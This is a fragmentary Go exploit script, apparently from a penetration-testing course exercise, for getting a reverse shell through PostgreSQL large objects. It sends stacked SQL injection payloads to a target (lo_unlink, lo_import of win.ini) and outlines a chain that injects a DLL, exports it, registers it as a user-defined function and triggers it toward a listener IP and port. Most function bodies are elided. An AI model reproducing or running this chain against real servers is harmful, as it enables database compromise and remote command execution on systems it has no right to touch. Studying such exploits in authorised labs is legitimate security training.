...
// Ex 5.8.2.1 - PostgreSQL Large Object reverse shell
...
func deleteLO(debug bool, ip string) {
	sqli := fmt.Sprintf("1;SELECT+lo_unlink(%s);--", loid)
	...
	// send the request
	utils.PrintInfo("Deleting existing LO...")
	...
	utils.PrintSuccess("loid cleared for use!")
	fmt.Println("")
}

func createLO(debug bool, ip string) {
	sqli := fmt.Sprintf("1;SELECT+lo_import($$C:\\\\windows\\win.ini$$,%s);--", loid)
...
func injectDLL(debug bool, ip string) {
...
func exportLO(debug bool, ip string) {
...
func createUDFLO(debug bool, ip string) {
...
func triggerUDFLO(debug bool, ip, listenerIP, listenerPort string) {
...
func main() {
	...
	injectDLL(*debug, ip)
	exportLO(*debug, ip)
	createUDFLO(*debug, ip)
	triggerUDFLO(*debug, ip, listenerIP, listenerPort)
}
